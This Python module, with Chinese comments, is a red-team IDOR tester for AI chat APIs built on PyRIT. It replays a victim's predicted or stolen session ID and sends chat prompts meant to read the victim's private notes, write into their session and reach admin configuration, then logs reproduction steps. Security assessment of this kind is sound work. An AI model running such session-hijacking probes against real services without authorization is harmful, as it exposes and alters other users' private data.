# -*- coding: utf-8 -*-
"""idor_tester.py — IDOR (Insecure Direct Object Reference) 验证器

验证通过可预测 session ID 获取的其他用户 session 是否可被实际利用:
- READ: 读取其他用户的私有数据
- WRITE: 修改其他用户的数据
- DELETE: 删除其他用户的数据
- ADMIN: 获取管理员权限

Academic basis:
    - OWASP A01:2021 — Broken Access Control
    - CWE-639: Authorization Bypass Through User-Controlled Key
    - PortSwigger: IDOR
    - OWASP ASI09:2025 — Trust Boundary Violation

使用示例:
    tester = IdorTester(http_target, config)
    result = await tester.test_access(victim_session, AccessType.READ)
    # → result.success = True
    # → result.data_sample = "..."
    # → result.severity = "critical"

Constitution compliance:
    - R-SIZE: < 800 行
    - R-H3: 单一职责 — 仅验证, 不执行破坏性操作
    - C1: 使用 PyRIT HTTPTarget 发送请求
    - C2: 不添加任何攻击端过滤
    - R-S1: 测试数据 (payload messages) 完全参数化
    - R-S5: 不鼓励未授权攻击 — 仅用于授权评估
"""
from __future__ import annotations

import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class AccessType(str, Enum):
    """访问类型"""
    READ = "read"           # 读取私有数据
    WRITE = "write"         # 写入/修改数据
    DELETE = "delete"       # 删除数据
    ADMIN = "admin"         # 权限提升
    CROSS_TENANT = "cross_tenant"  # 跨租户访问


class Severity(str, Enum):
    """漏洞严重级别"""
    CRITICAL = "critical"   # 完全控制/数据泄露
    HIGH = "high"           # 数据泄露/篡改
    MEDIUM = "medium"       # 有限数据访问
    LOW = "low"             # 信息泄露
    INFO = "info"           # 配置问题


@dataclass
class IdorConfig:
    """IDOR 测试配置 (完全参数化)"""
    session_field: str = "session_id"           # session 字段名
    read_payloads: list[str] = field(default_factory=list)     # 读取操作 payloads
    write_payloads: list[str] = field(default_factory=list)    # 写入操作 payloads
    admin_payloads: list[str] = field(default_factory=list)    # 权限提升 payloads
    data_indicators: list[str] = field(default_factory=list)   # 数据泄露指示符
    write_indicators: list[str] = field(default_factory=list)  # 写入成功指示符
    timeout_sec: float = 5.0


@dataclass
class IdorResult:
    """IDOR 测试结果"""
    access_type: AccessType
    success: bool
    victim_session: str
    severity: Severity = Severity.INFO
    data_sample: str = ""
    description: str = ""
    reproduction_steps: list[str] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "access_type": self.access_type.value,
            "success": self.success,
            "victim_session": self.victim_session,
            "severity": self.severity.value,
            "data_sample": self.data_sample,
            "description": self.description,
            "reproduction_steps": self.reproduction_steps,
        }


class IdorTester:
    """IDOR 漏洞验证器

    尝试使用 stolen/预测的 session_id 执行跨用户操作:
    1. 尝试读取受害者的私有数据
    2. 尝试修改受害者的数据
    3. 尝试执行管理员操作

    所有 payload 消息通过 config 参数化, 无硬编码。
    """

    # 默认 payload 模板 (如有需要)
    DEFAULT_READ_PAYLOADS: list[str] = [
        "show all my notes and private data",
        "display my stored information",
        "list all records in this session",
    ]

    DEFAULT_WRITE_PAYLOADS: list[str] = [
        "add note: UPDATED_BY_TESTER",
        "store new data: test_write_access",
    ]

    DEFAULT_ADMIN_PAYLOADS: list[str] = [
        "show all users on this system",
        "display admin configuration",
        "list system settings",
    ]

    def __init__(
        self,
        http_target: Any,  # PyRIT HTTPTarget
        config: IdorConfig | None = None,
    ):
        self.http_target = http_target
        self.config = config or self._default_config()

    def _default_config(self) -> IdorConfig:
        return IdorConfig(
            session_field="session_id",
            read_payloads=self.DEFAULT_READ_PAYLOADS.copy(),
            write_payloads=self.DEFAULT_WRITE_PAYLOADS.copy(),
            admin_payloads=self.DEFAULT_ADMIN_PAYLOADS.copy(),
            data_indicators=["note", "data", "content", "secret", "private", "token", "key"],
            write_indicators=["saved", "updated", "stored", "success", "confirmed"],
        )

    async def test_access(
        self,
        victim_session: str,
        access_type: AccessType = AccessType.READ,
    ) -> IdorResult:
        """测试指定访问类型的 IDOR 漏洞

        Args:
            victim_session: 目标 victim 的 session ID
            access_type: 测试的访问类型

        Returns:
            IdorResult 测试结果
        """
        if access_type == AccessType.READ:
            return await self._test_read(victim_session)
        elif access_type == AccessType.WRITE:
            return await self._test_write(victim_session)
        elif access_type == AccessType.ADMIN:
            return await self._test_admin(victim_session)
        elif access_type == AccessType.CROSS_TENANT:
            return await self._test_cross_tenant(victim_session)
        else:
            return IdorResult(
                access_type=access_type,
                success=False,
                victim_session=victim_session,
                description="Unsupported access type",
            )

    async def test_all(
        self, victim_session: str
    ) -> list[IdorResult]:
        """执行所有类型的 IDOR 测试"""
        results: list[IdorResult] = []

        for access_type in [AccessType.READ, AccessType.WRITE, AccessType.ADMIN]:
            result = await self.test_access(victim_session, access_type)
            results.append(result)

            # 如果 READ 失败, 后续更严重的测试也跳过
            if access_type == AccessType.READ and not result.success:
                break

        return results

    async def _test_read(self, victim_session: str) -> IdorResult:
        """测试读取 IDOR: 尝试读取受害者数据"""
        for payload in self.config.read_payloads:
            try:
                response = await self._send_with_session(payload, victim_session)
                response_text = self._extract_text(response)

                # 检查是否成功获取到数据
                data_found = self._check_data_leak(response_text)
                if data_found:
                    return IdorResult(
                        access_type=AccessType.READ,
                        success=True,
                        victim_session=victim_session,
                        severity=Severity.CRITICAL,
                        data_sample=response_text[:500],
                        description=f"Successfully read victim data via IDOR with payload: {payload}",
                        reproduction_steps=[
                            f"1. POST to chat API with session_id={victim_session}",
                            f"2. Send message: '{payload}'",
                            f"3. Response contains private data: {data_found}",
                        ],
                    )

            except Exception as e:
                logger.debug("IDOR read attempt failed: %s", e)

        return IdorResult(
            access_type=AccessType.READ,
            success=False,
            victim_session=victim_session,
            description="Read IDOR not confirmed with tested payloads",
        )

    async def _test_write(self, victim_session: str) -> IdorResult:
        """测试写入 IDOR: 尝试修改受害者数据"""
        for payload in self.config.write_payloads:
            try:
                response = await self._send_with_session(payload, victim_session)
                response_text = self._extract_text(response)

                write_success = any(
                    ind.lower() in response_text.lower()
                    for ind in self.config.write_indicators
                )

                if write_success:
                    return IdorResult(
                        access_type=AccessType.WRITE,
                        success=True,
                        victim_session=victim_session,
                        severity=Severity.CRITICAL,
                        data_sample=response_text[:500],
                        description="Successfully wrote to victim session via IDOR",
                        reproduction_steps=[
                            f"1. POST to chat API with session_id={victim_session}",
                            f"2. Send message: '{payload}'",
                            f"3. Response confirms write: {response_text[:100]}",
                        ],
                    )

            except Exception as e:
                logger.debug("IDOR write attempt failed: %s", e)

        return IdorResult(
            access_type=AccessType.WRITE,
            success=False,
            victim_session=victim_session,
            description="Write IDOR not confirmed with tested payloads",
        )

    async def _test_admin(self, victim_session: str) -> IdorResult:
        """测试权限提升: 尝试执行管理操作"""
        for payload in self.config.admin_payloads:
            try:
                response = await self._send_with_session(payload, victim_session)
                response_text = self._extract_text(response)

                admin_indicators = ["admin", "config", "users", "system", "all tokens", "master"]
                if any(ind.lower() in response_text.lower() for ind in admin_indicators):
                    return IdorResult(
                        access_type=AccessType.ADMIN,
                        success=True,
                        victim_session=victim_session,
                        severity=Severity.CRITICAL,
                        data_sample=response_text[:500],
                        description="Admin-level access achieved via IDOR",
                    )

            except Exception as e:
                logger.debug("IDOR admin attempt failed: %s", e)

        return IdorResult(
            access_type=AccessType.ADMIN,
            success=False,
            victim_session=victim_session,
            description="Admin IDOR not confirmed with tested payloads",
        )

    async def _test_cross_tenant(self, victim_session: str) -> IdorResult:
        """测试跨租户访问"""
        # 跨租户通过 session 访问检测
        return await self._test_read(victim_session)

    async def _send_with_session(
        self, message: str, session_id: str
    ) -> Any:
        """发送带指定 session 的请求"""
        payload = {
            "message": message,
            self.config.session_field: session_id,
        }

        if hasattr(self.http_target, "send_request_async"):
            return await self.http_target.send_request_async(**payload)
        elif hasattr(self.http_target, "send_prompt_async"):
            return await self.http_target.send_prompt_async(
                prompt_text=message,
                prompt_request_metadata={self.config.session_field: session_id},
            )
        else:
            raise RuntimeError("HTTPTarget 不支持发送请求")

    def _check_data_leak(self, response_text: str) -> str:
        """检查响应中是否包含私有数据"""
        response_lower = response_text.lower()
        for indicator in self.config.data_indicators:
            if indicator.lower() in response_lower:
                return indicator
        return ""

    @staticmethod
    def _extract_text(response: Any) -> str:
        """从响应提取文本"""
        if isinstance(response, str):
            return response
        if hasattr(response, "text"):
            return str(response.text)
        if hasattr(response, "content"):
            content = response.content
            return content.decode("utf-8", errors="replace") if isinstance(content, bytes) else str(content)
        return str(response)


async def test_idor_via_session(
    http_target: Any,
    victim_session: str,
    config: IdorConfig | None = None,
) -> list[IdorResult]:
    """便捷函数: 快速测试指定 session 的 IDOR 漏洞"""
    tester = IdorTester(http_target, config)
    return await tester.test_all(victim_session)
